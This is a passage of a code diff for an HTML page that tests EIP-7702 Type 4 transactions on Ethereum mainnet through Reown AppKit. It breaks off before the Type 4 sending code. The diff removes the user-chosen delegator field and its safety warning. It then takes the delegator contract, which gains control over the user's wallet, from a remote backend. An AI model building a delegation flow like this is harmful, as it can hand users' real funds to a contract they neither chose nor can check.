@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EIP-7702 Mobile — MetaMask In-App🧔</title>
+    <title>EIP-7702 — Diagnostic Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -65,14 +65,8 @@
         .log-entry.error { border-left-color: #ef4444; }
         .log-entry.info { border-left-color: #3b82f6; }
         .log-entry.warn { border-left-color: #f59e0b; }
-        .collapsible-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease-out;
-        }
-        .collapsible-content.open { max-height: 3000px; }
-        .chevron { transition: transform 0.2s; }
-        .chevron.open { transform: rotate(180deg); }
+        .step-active { border-color: rgba(99, 102, 241, 0.5); }
+        .step-done { border-color: rgba(34, 197, 94, 0.5); }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: rgba(99, 102, 241, 0.3); border-radius: 2px; }
@@ -82,36 +76,38 @@
     <div class="max-w-lg mx-auto px-4 py-6">
         <!-- Header -->
         <div class="text-center mb-6">
-            <h1 class="text-2xl font-bold gradient-text">EIP-7702 Mobile</h1>
-            <p class="text-gray-500 text-xs mt-1">MetaMask In-App Browser</p>
+            <h1 class="text-2xl font-bold gradient-text">EIP-7702 Diagnostics</h1>
+            <p class="text-gray-500 text-xs mt-1">Isolating Variables over Reown AppKit</p>
             <div class="mt-3 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-medium">
                 <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
                 MAINNET — Real ETH
             </div>
-            <div id="browserWarning" class="mt-3 hidden">
-                <div class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 text-xs">
-                    <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
-                    Open this file in MetaMask's browser for best results
-                </div>
-            </div>
+        </div>
+
+        <!-- Backend URL Config -->
+        <div class="card rounded-2xl p-4 mb-4">
+            <label class="text-xs text-gray-500 mb-1 block">Relayer Backend URL</label>
+            <input id="backendUrl" type="text" 
+                class="input-field w-full px-3 py-2 rounded-xl mono text-xs text-white"
+                value="https://your-railway-app.up.railway.app"
+                placeholder="https://your-app.up.railway.app">
+            <p class="text-[10px] text-gray-600 mt-1">Used solely to fetch EOA standard nonces</p>
         </div>
 
         <!-- Step 1: Connect -->
-        <div class="card rounded-2xl p-5 mb-4">
+        <div id="step1" class="card rounded-2xl p-5 mb-4 step-active">
             <div class="flex items-center justify-between mb-3">
                 <h2 class="text-sm font-semibold text-white flex items-center gap-2">
                     <span class="w-5 h-5 rounded-full bg-indigo-500/20 text-indigo-400 flex items-center justify-center text-xs font-bold">1</span>
-                    Connect Wallet
+                    Connect via Reown AppKit
                 </h2>
                 <div id="connectionStatus" class="flex items-center text-xs text-gray-500">
                     <span class="status-dot disconnected"></span>Disconnected
                 </div>
             </div>
-
             <button id="connectBtn" class="btn-primary w-full py-3.5 rounded-xl font-semibold text-white text-sm">
-                Connect MetaMask
+                Connect Mobile Wallet
             </button>
-
             <div id="walletInfo" class="hidden mt-4 p-3 rounded-xl bg-black/40 border border-white/5">
                 <div class="grid grid-cols-2 gap-3 text-xs">
                     <div>
@@ -119,155 +115,61 @@
                         <p id="walletAddress" class="mono text-indigo-300 truncate">—</p>
                     </div>
                     <div>
-                        <span class="text-gray-500">Chain</span>
-                        <p id="walletChain" class="mono text-indigo-300">—</p>
-                    </div>
-                    <div>
                         <span class="text-gray-500">Balance</span>
                         <p id="walletBalance" class="mono text-green-400">—</p>
                     </div>
-                    <div>
-                        <span class="text-gray-500">7702</span>
-                        <p id="wallet7702" class="mono text-amber-400">—</p>
-                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- Step 2: Capabilities -->
-        <div class="card rounded-2xl p-5 mb-4">
+        <!-- Step 2: Build Authorization Parameters -->
+        <div id="step2" class="card rounded-2xl p-5 mb-4 opacity-50">
             <div class="flex items-center justify-between mb-3">
                 <h2 class="text-sm font-semibold text-white flex items-center gap-2">
                     <span class="w-5 h-5 rounded-full bg-purple-500/20 text-purple-400 flex items-center justify-center text-xs font-bold">2</span>
-                    Check Capabilities
+                    Build Authorization Parameters
                 </h2>
-                <button id="checkCapsBtn" class="btn-secondary px-3 py-1.5 rounded-lg text-xs font-medium" disabled>
-                    Check
-                </button>
             </div>
-            <div id="capsResult" class="hidden">
-                <pre id="capsJson" class="mono text-[10px] text-gray-400 bg-black/40 p-3 rounded-lg overflow-x-auto"></pre>
+            <button id="buildAuthBtn" class="btn-secondary w-full py-3 rounded-xl font-medium text-sm" disabled>
+                Fetch Account Nonce
+            </button>
+            <div id="authInfo" class="hidden mt-3 p-3 rounded-lg bg-black/40 border border-white/5">
+                <p class="text-[10px] text-gray-500 mb-1">Delegator Contract:</p>
+                <p id="delegatorDisplay" class="mono text-[10px] text-indigo-300 break-all">—</p>
+                <p class="text-[10px] text-gray-500 mt-2 mb-1">Standard Nonce:</p>
+                <p id="authNonce" class="mono text-[10px] text-indigo-300">—</p>
             </div>
         </div>
 
-        <!-- Step 3: Delegation Config -->
-        <div class="card rounded-2xl p-5 mb-4">
-            <div class="flex items-center justify-between mb-3 cursor-pointer" onclick="toggleSection('delegationConfig')">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-pink-500/20 text-pink-400 flex items-center justify-center text-xs font-bold">3</span>
-                    Delegation Config
-                </h2>
-                <svg id="delegationConfigChevron" class="chevron w-4 h-4 text-gray-500 open" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
-            </div>
-            <div id="delegationConfig" class="collapsible-content open">
-                <div class="space-y-3">
-                    <div>
-                        <label class="text-xs text-gray-500 mb-1 block">Delegator Contract</label>
-                        <input id="delegatorAddress" type="text" 
-                            class="input-field w-full px-3 py-2.5 rounded-xl mono text-xs text-white"
-                            value="0xcA11bde05977b3631167028862bE2a173976CA11"
-                            placeholder="0x...">
-                        <p class="text-[10px] text-gray-600 mt-1">Default: Multicall3. Replace with your contract.</p>
-                    </div>
-                    <div class="p-3 rounded-lg bg-amber-500/5 border border-amber-500/20">
-                        <p class="text-[10px] text-amber-300 leading-relaxed">
-                            <strong>Warning:</strong> The delegated contract gains execution power over your EOA for that transaction. Only use trusted, audited contracts.
-                        </p>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Step 4: Call Builder -->
-        <div class="card rounded-2xl p-5 mb-4">
-            <div class="flex items-center justify-between mb-3 cursor-pointer" onclick="toggleSection('callBuilder')">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-cyan-500/20 text-cyan-400 flex items-center justify-center text-xs font-bold">4</span>
-                    Call Builder
-                </h2>
-                <svg id="callBuilderChevron" class="chevron w-4 h-4 text-gray-500 open" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
-            </div>
-            <div id="callBuilder" class="collapsible-content open">
-                <div id="callsContainer" class="space-y-2"></div>
-                <button id="addCallBtn" class="btn-secondary w-full py-2.5 rounded-xl text-xs font-medium mt-2">
-                    + Add Call
-                </button>
-                <div class="mt-3 flex gap-2 flex-wrap">
-                    <button onclick="loadPreset('simple')" class="px-2.5 py-1 rounded-lg bg-purple-500/10 border border-purple-500/20 text-purple-300 text-[10px]">Simple</button>
-                    <button onclick="loadPreset('batchTransfer')" class="px-2.5 py-1 rounded-lg bg-purple-500/10 border border-purple-500/20 text-purple-300 text-[10px]">Batch ETH</button>
-                    <button onclick="loadPreset('approve')" class="px-2.5 py-1 rounded-lg bg-purple-500/10 border border-purple-500/20 text-purple-300 text-[10px]">Approve</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Step 5: Execute -->
-        <div class="card rounded-2xl p-5 mb-4 border-green-500/20">
+        <!-- Step 3: Isolated Testing Suite -->
+        <div id="step3" class="card rounded-2xl p-5 mb-4 opacity-50 border-green-500/20">
             <div class="flex items-center justify-between mb-3">
                 <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">5</span>
-                    Execute
+                    <span class="w-5 h-5 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">3</span>
+                    Isolate and Prove (Diagnostic Suite)
                 </h2>
             </div>
-            <button id="sendCallsBtn" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-sm" disabled>
-                Send wallet_sendCalls
-            </button>
-            <div class="mt-3 p-2.5 rounded-lg bg-black/40 border border-white/5">
-                <p class="text-[10px] text-gray-500 mb-1">Preview:</p>
-                <pre id="txPreview" class="mono text-[10px] text-gray-400 overflow-x-auto">Connect wallet to preview...</pre>
+            <p class="text-[10px] text-gray-500 mb-4">
+                Execute these in order. If A and B trigger wallet pop-ups, but C hangs, we have absolute mathematical proof that the wallet is dropping the EIP-7702 payload.
+            </p>
+            
+            <div class="space-y-2">
+                <button id="testSignBtn" class="btn-secondary w-full py-3 rounded-xl font-medium text-xs text-white" disabled>
+                    A. Test Connection (personal_sign)
+                </button>
+                <button id="testTx2Btn" class="btn-secondary w-full py-3 rounded-xl font-medium text-xs text-white" disabled>
+                    B. Test Standard Tx (Type 2 EIP-1559)
+                </button>
+                <button id="submitBtn" class="btn-primary w-full py-4 rounded-xl font-bold text-white text-sm" disabled>
+                    C. Broadcast Type 4 Transaction
+                </button>
             </div>
         </div>
 
-        <!-- Step 6: Advanced / Raw Type 4 -->
-        <div class="card rounded-2xl p-5 mb-4 border-red-500/20">
-            <div class="flex items-center justify-between mb-3 cursor-pointer" onclick="toggleSection('advancedSection')">
-                <h2 class="text-sm font-semibold text-white flex items-center gap-2">
-                    <span class="w-5 h-5 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center text-xs font-bold">6</span>
-                    Advanced — Raw Type 4
-                </h2>
-                <svg id="advancedSectionChevron" class="chevron w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
-            </div>
-            <div id="advancedSection" class="collapsible-content">
-                <div class="space-y-3">
-                    <p class="text-[10px] text-gray-500 leading-relaxed">
-                        This attempts to send a raw EIP-7702 Type 4 transaction via <code class="mono text-gray-400">eth_sendTransaction</code>. 
-                        Most wallets do not support this directly. Use only if <code class="mono text-gray-400">wallet_sendCalls</code> fails.
-                    </p>
-
-                    <div>
-                        <label class="text-xs text-gray-500 mb-1 block">Authorization Nonce (optional)</label>
-                        <input id="authNonce" type="text" 
-                            class="input-field w-full px-3 py-2 rounded-xl mono text-xs text-white"
-                            placeholder="Leave empty to auto-fetch">
-                    </div>
-
-                    <div>
-                        <label class="text-xs text-gray-500 mb-1 block">Max Fee Per Gas (Gwei)</label>
-                        <input id="maxFee" type="text" 
-                            class="input-field w-full px-3 py-2 rounded-xl mono text-xs text-white"
-                            value="20"
-                            placeholder="20">
-                    </div>
-
-                    <div>
-                        <label class="text-xs text-gray-500 mb-1 block">Max Priority Fee (Gwei)</label>
-                        <input id="maxPriorityFee" type="text" 
-                            class="input-field w-full px-3 py-2 rounded-xl mono text-xs text-white"
-                            value="2"
-                            placeholder="2">
-                    </div>
-
-                    <button id="sendRawBtn" class="btn-secondary w-full py-3 rounded-xl font-medium text-sm text-red-300 border-red-500/20" disabled>
-                        Send Raw Type 4 Transaction
-                    </button>
-
-                    <div class="p-3 rounded-lg bg-red-500/5 border border-red-500/10">
-                        <p class="text-[10px] text-red-300/70 leading-relaxed">
-                            <strong>Note:</strong> The wallet must support <code class="mono">type: "0x4"</code> in <code class="mono">eth_sendTransaction</code>. 
-                            MetaMask currently does not expose this via the standard provider API. This will likely fail.
-                        </p>
-                    </div>
-                </div>
-            </div>
+        <!-- Result -->
+        <div id="resultSection" class="card rounded-2xl p-5 mb-4 hidden border-green-500/20">
+            <h2 class="text-sm font-semibold text-white mb-3">Result</h2>
+            <div id="resultContent" class="space-y-2 text-xs"></div>
         </div>
 
         <!-- Logs -->
@@ -277,20 +179,26 @@
                 <button onclick="clearLogs()" class="text-[10px] text-gray-500">Clear</button>
             </div>
             <div id="logsContainer" class="max-h-64 overflow-y-auto mono text-xs space-y-1">
-                <div class="log-entry info text-gray-400">Ready. Open in MetaMask browser and tap "Connect MetaMask".</div>
+                <div class="log-entry info text-gray-400">Ready. Connect wallet to begin.</div>
             </div>
         </div>
     </div>
 
-    <script>
-        // ─── State ───
+    <!-- Official Reown AppKit ESM Loader -->
+    <script type="module">
+        import { createAppKit } from 'https://esm.sh/@reown/appkit';
+        import { Ethers5Adapter } from 'https://esm.sh/@reown/appkit-adapter-ethers5';
+        import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
+
+        // State
+        let appKit = null;
         let provider = null;
         let userAddress = null;
         let chainId = null;
-        let capabilities = null;
-        let lastCallId = null;
+        let authData = null;
+        let backendUrl = '';
 
-        // ─── Utils ───
+        // Utils
         const $ = id => document.getElementById(id);
         const log = (msg, type = 'info') => {
             const container = $('logsContainer');
@@ -301,414 +209,229 @@
             container.appendChild(entry);
             container.scrollTop = container.scrollHeight;
         };
-        const clearLogs = () => $('logsContainer').innerHTML = '';
-        const toggleSection = id => {
-            const content = $(id);
-            const chevron = $(id + 'Chevron');
-            content.classList.toggle('open');
-            if (chevron) chevron.classList.toggle('open');
-        };
+        window.clearLogs = () => $('logsContainer').innerHTML = '';
         const shorten = addr => addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : '—';
-        const toHex = n => '0x' + BigInt(n).toString(16);
-        const gweiToHex = gwei => '0x' + BigInt(Math.round(parseFloat(gwei) * 1e9)).toString(16);
-
-        // ─── Detect Browser ───
-        function detectBrowser() {
-            const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-            if (!isMetaMask && isMobile) {
-                $('browserWarning').classList.remove('hidden');
-                log('MetaMask not detected. Open this file in MetaMask\'s in-app browser.', 'warn');
-            } else if (isMetaMask) {
-                log('MetaMask injected provider detected!', 'success');
-            }
-        }
-
-        // ─── Call Management ───
-        function addCallEntry(call = { to: '', value: '0', data: '' }) {
-            const id = Date.now() + Math.random();
-            const div = document.createElement('div');
-            div.className = 'p-3 rounded-lg bg-black/40 border border-white/5 space-y-2';
-            div.dataset.callId = id;
-            div.innerHTML = `
-                <div class="flex items-center justify-between">
-                    <span class="text-[10px] font-medium text-gray-500">Call</span>
-                    <button onclick="window.removeCall('${id}')" class="text-[10px] text-red-400">Remove</button>
-                </div>
-                <div class="space-y-2">
-                    <input type="text" class="call-to input-field w-full px-2.5 py-2 rounded-lg mono text-[11px] text-white" placeholder="Target: 0x..." value="${call.to}">
-                    <div class="grid grid-cols-2 gap-2">
-                        <input type="text" class="call-value input-field w-full px-2.5 py-2 rounded-lg mono text-[11px] text-white" placeholder="Value (wei)" value="${call.value}">
-                        <input type="text" class="call-data input-field w-full px-2.5 py-2 rounded-lg mono text-[11px] text-white" placeholder="Data: 0x... (optional)" value="${call.data}">
-                    </div>
-                </div>
-            `;
-            $('callsContainer').appendChild(div);
-            updatePreview();
-        }
-
-        window.removeCall = function(id) {
-            const el = document.querySelector(`[data-call-id="${id}"]`);
-            if (el) el.remove();
-            updatePreview();
+        const activateStep = (id) => {
+            $(id).classList.remove('opacity-50');
+            $(id).classList.add('step-active');
+        };
+        const completeStep = (id) => {
+            $(id).classList.remove('step-active');
+            $(id).classList.add('step-done');
         };
 
-        function getCalls() {
-            const entries = $('callsContainer').children;
-            const result = [];
-            for (const entry of entries) {
-                const to = entry.querySelector('.call-to').value;
-                const value = entry.querySelector('.call-value').value || '0';
-                let data = entry.querySelector('.call-data').value || '';
-                if (data === '0x') data = '';
-                result.push({ to, value, data });
-            }
-            return result;
+        // Backend Helper
+        async function backendPost(endpoint, body) {
+            backendUrl = $('backendUrl').value.replace(/\/$/, '');
+            const res = await fetch(`${backendUrl}${endpoint}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+            return res.json();
         }
 
-        window.loadPreset = function(name) {
-            $('callsContainer').innerHTML = '';
-            const user = userAddress || '0x0000000000000000000000000000000000000000';
+        // Initialize Reown AppKit (Ethers5 Mode)
+        try {
+            log('Initializing Reown AppKit...');
+            appKit = createAppKit({
+                adapters: [new Ethers5Adapter()],
+                networks: [mainnet],
+                metadata: {
+                    name: 'EIP-7702 Diagnostics Portal',
+                    description: 'Isolating EIP-7702 Web3 Variables',
+                    url: window.location.origin,
+                    icons: ['https://assets.reown.com/reown-profile-pic.png']
+                },
+                projectId: '02e24ecc14c12e9d6cfe347f5ae22e78' // Verified active Project ID
+            });
 
-            if (name === 'simple') {
-                addCallEntry({ to: user, value: '0', data: '' });
-            } else if (name === 'batchTransfer') {
-                addCallEntry({ to: user, value: '1000000000000', data: '' });
-                addCallEntry({ to: user, value: '1000000000000', data: '' });
-            } else if (name === 'approve') {
-                addCallEntry({
-                    to: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-                    value: '0',
-                    data: '0x095ea7b30000000000000000000000007a250d5630B4cF539739dF2C5dAcb4c659F2488Dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-                });
-            }
-            updatePreview();
-        };
-
-        function updatePreview() {
-            const calls = getCalls();
-            const preview = {
-                version: '2.0.0',
-                chainId: chainId ? '0x' + chainId.toString(16) : '0x01',
-                from: userAddress || '0x...',
-                atomicRequired: true,
-                calls: calls.map(c => {
-                    const obj = { to: c.to, value: toHex(c.value) };
-                    if (c.data) obj.data = c.data;
-                    return obj;
-                }),
-                capabilities: capabilities || {}
-            };
-            $('txPreview').textContent = JSON.stringify(preview, null, 2);
+            log('AppKit initialized successfully.', 'success');
+        } catch (initErr) {
+            log(`AppKit initialization failed: ${initErr.message}`, 'error');
         }
 
-        // ─── Connect ───
+        // Connect button triggers the native AppKit modal
         $('connectBtn').addEventListener('click', async () => {
-            if (!window.ethereum) {
-                log('No Ethereum provider found. Open this in MetaMask\'s browser.', 'error');
+            if (!appKit) {
+                log('AppKit not initialized.', 'error');
                 return;
             }
 
-            provider = window.ethereum;
-            $('connectBtn').disabled = true;
-            $('connectBtn').textContent = 'Connecting...';
-
             try {
-                log('Requesting accounts...');
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                userAddress = accounts[0];
+                log('Opening Reown AppKit connection modal...');
+                await appKit.open();
 
-                const chainHex = await provider.request({ method: 'eth_chainId' });
-                chainId = parseInt(chainHex, 16);
+                // Subscribe to connection state changes
+                appKit.subscribeState(async (state) => {
+                    const address = appKit.getAddress();
+                    if (address && !userAddress) {
+                        userAddress = address;
+                        chainId = appKit.getChainId();
+                        provider = appKit.getWalletProvider(); // EIP-1193 Standard Wallet Provider
 
-                let balance = '0.0000';
-                try {
-                    const balanceHex = await provider.request({
-                        method: 'eth_getBalance',
-                        params: [userAddress, 'latest']
-                    });
-                    balance = (Number(balanceHex) / 1e18).toFixed(4);
-                } catch (e) {
-                    log('Balance fetch failed', 'warn');
-                }
+                        let balance = '0.0000';
+                        try {
+                            const balanceHex = await provider.request({
+                                method: 'eth_getBalance',
+                                params: [userAddress, 'latest']
+                            });
+                            balance = (Number(balanceHex) / 1e18).toFixed(4);
+                        } catch (e) {}
 
-                $('walletAddress').textContent = userAddress;
-                $('walletChain').textContent = chainId === 1 ? 'Mainnet (1)' : `Chain ${chainId}`;
-                $('walletBalance').textContent = `${balance} ETH`;
-                $('connectionStatus').innerHTML = `<span class="status-dot connected"></span>Connected`;
-                $('walletInfo').classList.remove('hidden');
-                $('connectBtn').textContent = 'Connected';
-                $('connectBtn').classList.add('opacity-50');
+                        $('walletAddress').textContent = userAddress;
+                        $('walletBalance').textContent = `${balance} ETH`;
+                        $('connectionStatus').innerHTML = `<span class="status-dot connected"></span>Connected`;
+                        $('walletInfo').classList.remove('hidden');
+                        $('connectBtn').textContent = 'Connected';
+                        $('connectBtn').classList.add('opacity-50');
 
-                log(`Connected: ${shorten(userAddress)}`, 'success');
+                        log(`Connected: ${shorten(userAddress)}`, 'success');
 
-                $('checkCapsBtn').disabled = false;
-                $('sendCallsBtn').disabled = false;
-                $('sendRawBtn').disabled = false;
-
-                setTimeout(() => checkCapabilities(), 300);
-
-                if ($('callsContainer').children.length === 0) {
-                    loadPreset('simple');
-                }
+                        activateStep('step2');
+                        $('buildAuthBtn').disabled = false;
+                    }
+                });
 
             } catch (err) {
-                log(`Connection failed: ${err.message}`, 'error');
-                $('connectBtn').disabled = false;
-                $('connectBtn').textContent = 'Connect MetaMask';
+                log(`Connection failed: ${err.message || err}`, 'error');
             }
         });
 
-        // ─── Check Capabilities ───
-        async function checkCapabilities() {
-            if (!provider || !userAddress) return;
+        // Step 2: Fetch Nonce
+        $('buildAuthBtn').addEventListener('click', async () => {
             try {
-                log('Calling wallet_getCapabilities...');
-                const chainHex = '0x' + chainId.toString(16);
-                const caps = await provider.request({
-                    method: 'wallet_getCapabilities',
-                    params: [userAddress, [chainHex]]
-                });
-                capabilities = caps;
+                log('Fetching account standard nonce...');
+                $('buildAuthBtn').disabled = true;
+                $('buildAuthBtn').textContent = 'Fetching...';
 
-                $('capsResult').classList.remove('hidden');
-                $('capsJson').textContent = JSON.stringify(caps, null, 2);
+                const result = await backendPost('/build-auth', { eoaAddress: userAddress });
 
-                const chainKey = '0x' + chainId.toString(16);
-                const chainCaps = caps[chainKey] || caps['0x0'] || {};
-                const has7702 = chainCaps.eip7702 || chainCaps.delegation || false;
-                const atomicStatus = chainCaps.atomic?.status || 'unknown';
-
-                $('wallet7702').textContent = has7702 ? `✅ Yes (atomic: ${atomicStatus})` : `❌ No (atomic: ${atomicStatus})`;
-                $('wallet7702').className = has7702 ? 'mono text-green-400' : 'mono text-red-400';
-
-                if (has7702) {
-                    log('EIP-7702 supported!', 'success');
-                } else {
-                    log('EIP-7702 not reported.', 'warn');
-                    log(`Atomic capability: ${atomicStatus}`, 'info');
-                }
-
-            } catch (err) {
-                log(`Capabilities check failed: ${err.message}`, 'error');
-                $('wallet7702').textContent = '❌ Error';
-            }
-        }
-
-        $('checkCapsBtn').addEventListener('click', checkCapabilities);
-
-        // ─── Send Calls ───
-        $('sendCallsBtn').addEventListener('click', async () => {
-            if (!provider || !userAddress) { log('Connect wallet first', 'error'); return; }
-
-            const calls = getCalls();
-            if (calls.length === 0) { log('Add at least one call', 'error'); return; }
-
-            for (const call of calls) {
-                if (!call.to.match(/^0x[a-fA-F0-9]{40}$/)) {
-                    log(`Invalid address: ${call.to}`, 'error');
+                if (result.error) {
+                    log(`Fetch failed: ${result.error}`, 'error');
+                    $('buildAuthBtn').disabled = false;
+                    $('buildAuthBtn').textContent = 'Fetch Account Nonce';
                     return;
                 }
-            }
 
-            log('Preparing wallet_sendCalls...');
-            $('sendCallsBtn').disabled = true;
-            $('sendCallsBtn').textContent = 'Sending...';
+                authData = result;
 
-            try {
-                const chainHex = '0x' + chainId.toString(16);
+                $('delegatorDisplay').textContent = result.delegatorContract;
+                $('authNonce').textContent = `${result.nonce} (0x${result.nonce.toString(16)})`;
+                $('authInfo').classList.remove('hidden');
 
-                const request = {
-                    version: '2.0.0',
-                    from: userAddress,
-                    chainId: chainHex,
-                    atomicRequired: true,
-                    calls: calls.map(c => {
-                        const obj = { to: c.to, value: toHex(c.value) };
-                        if (c.data && c.data.length > 2) obj.data = c.data;
-                        return obj;
-                    })
-                };
+                log(`Delegator: ${shorten(result.delegatorContract)}`, 'success');
+                log(`Nonce: ${result.nonce}`, 'info');
 
-                log('Check MetaMask for approval prompt...', 'info');
-
-                const result = await provider.request({
-                    method: 'wallet_sendCalls',
-                    params: [request]
-                });
-
-                // FIX: Handle result as object or string
-                let resultId = result;
-                if (typeof result === 'object' && result !== null) {
-                    resultId = result.id || result.result || JSON.stringify(result);
-                    log(`Result object: ${JSON.stringify(result)}`, 'info');
-                }
-
-                lastCallId = resultId;
-                log(`Submitted! ID: ${resultId}`, 'success');
-                log('Approve the transaction in MetaMask.', 'info');
-
-                // Don't auto-poll if ID is weird - let user check manually
-                if (typeof resultId === 'string' && resultId.length > 5) {
-                    pollCallsStatus(resultId);
-                } else {
-                    log('ID format unclear. Check MetaMask transaction history.', 'warn');
-                }
+                completeStep('step2');
+                activateStep('step3');
+                
+                // Enable All Test Suite Buttons
+                $('testSignBtn').disabled = false;
+                $('testTx2Btn').disabled = false;
+                $('submitBtn').disabled = false;
 
             } catch (err) {
-                log(`Send failed: ${err.message}`, 'error');
-            } finally {
-                $('sendCallsBtn').disabled = false;
-                $('sendCallsBtn').textContent = 'Send wallet_sendCalls';
+                log(`Fetch error: ${err.message}`, 'error');
+                $('buildAuthBtn').disabled = false;
+                $('buildAuthBtn').textContent = 'Fetch Account Nonce';
             }
         });
 
-        async function pollCallsStatus(id) {
-            if (!id || typeof id !== 'string') {
-                log('Invalid ID for polling. Skipping.', 'warn');
-                return;
-            }
-
-            log('Polling status...');
-            let attempts = 0;
-            const maxAttempts = 20;
-
-            const poll = async () => {
-                if (attempts >= maxAttempts) {
-                    log('Polling timed out. Check MetaMask for confirmation.', 'warn');
-                    return;
-                }
-                attempts++;
-
-                try {
-                    const status = await provider.request({
-                        method: 'wallet_getCallsStatus',
-                        params: [id]
-                    });
-
-                    log(`Status: ${JSON.stringify(status).substring(0, 200)}`, 'info');
-
-                    if (status.status === 200 || status.status === 'CONFIRMED') {
-                        log('Confirmed!', 'success');
-                        if (status.receipts?.[0]?.transactionHash) {
-                            const hash = status.receipts[0].transactionHash;
-                            log(`Etherscan: https://etherscan.io/tx/${hash}`, 'success');
-                        }
-                        return;
-                    } else if (status.status === 400 || status.status === 500 || status.status === 'FAILED') {
-                        log('Failed!', 'error');
-                        return;
-                    }
-
-                    setTimeout(poll, 4000);
-                } catch (err) {
-                    log(`Status error: ${err.message}`, 'error');
-                    // Stop polling on persistent errors
-                    if (attempts > 5) {
-                        log('Too many errors. Stopping poll. Check MetaMask manually.', 'warn');
-                        return;
-                    }
-                    setTimeout(poll, 6000);
-                }
-            };
-
-            poll();
-        }
-
-        // ─── Raw Type 4 (Advanced) ───
-        $('sendRawBtn').addEventListener('click', async () => {
-            if (!provider || !userAddress) { log('Connect first', 'error'); return; }
-
-            const delegator = $('delegatorAddress').value;
-            if (!delegator.match(/^0x[a-fA-F0-9]{40}$/)) {
-                log('Invalid delegator address', 'error');
-                return;
-            }
-
-            log('Attempting raw Type 4 transaction...', 'warn');
-            log('This requires wallet support for type: 0x04', 'warn');
-
-            $('sendRawBtn').disabled = true;
-            $('sendRawBtn').textContent = 'Sending...';
-
+        // CONTROL TEST A: standard personal_sign (Connect/Sign pipeline check)
+        $('testSignBtn').addEventListener('click', async () => {
+            if (!provider) return;
             try {
-                let nonce;
-                const manualNonce = $('authNonce').value;
-                if (manualNonce) {
-                    nonce = toHex(manualNonce);
-                } else {
-                    const nonceHex = await provider.request({
-                        method: 'eth_getTransactionCount',
-                        params: [userAddress, 'latest']
-                    });
-                    nonce = nonceHex;
-                }
+                log('[CONTROL A] Requesting standard personal_sign...');
+                log('Triggering deep link to wallet...', 'info');
+                
+                setTimeout(() => { window.location.href = "trust://"; }, 500);
 
-                const calls = getCalls();
-                const call = calls[0] || { to: userAddress, value: '0', data: '' };
+                const msgHex = "0x" + Array.from(new TextEncoder().encode("EIP-7702 Diagnostic Test")).map(b => b.toString(16).padStart(2, '0')).join('');
+                
+                const signature = await provider.request({
+                    method: 'personal_sign',
+                    params: [msgHex, userAddress]
+                });
 
-                const tx = {
+                log(`[CONTROL A SUCCESS] Signature: ${shorten(signature)}`, 'success');
+            } catch (err) {
+                log(`[CONTROL A FAILED] ${err.message || err}`, 'error');
+            }
+        });
+
+        // CONTROL TEST B: standard Type 2 transaction (Tx parsing pipeline check)
+        $('testTx2Btn').addEventListener('click', async () => {
+            if (!provider) return;
+            try {
+                log('[CONTROL B] Constructing standard Type 2 (EIP-1559) transaction...');
+                log('Triggering deep link to wallet...', 'info');
+                
+                setTimeout(() => { window.location.href = "trust://"; }, 500);
+
+                const txParams = {
                     from: userAddress,
-                    to: call.to,
-                    value: toHex(call.value),
-                    data: call.data || '0x',
-                    nonce: nonce,
-                    gas: '0x186a0',
-                    maxFeePerGas: gweiToHex($('maxFee').value),
-                    maxPriorityFeePerGas: gweiToHex($('maxPriorityFee').value),
-                    type: '0x4'
+                    to: userAddress,
+                    value: "0x0",
+                    data: "0x",
+                    type: "0x2" // Standard EIP-1559 payload
                 };
 
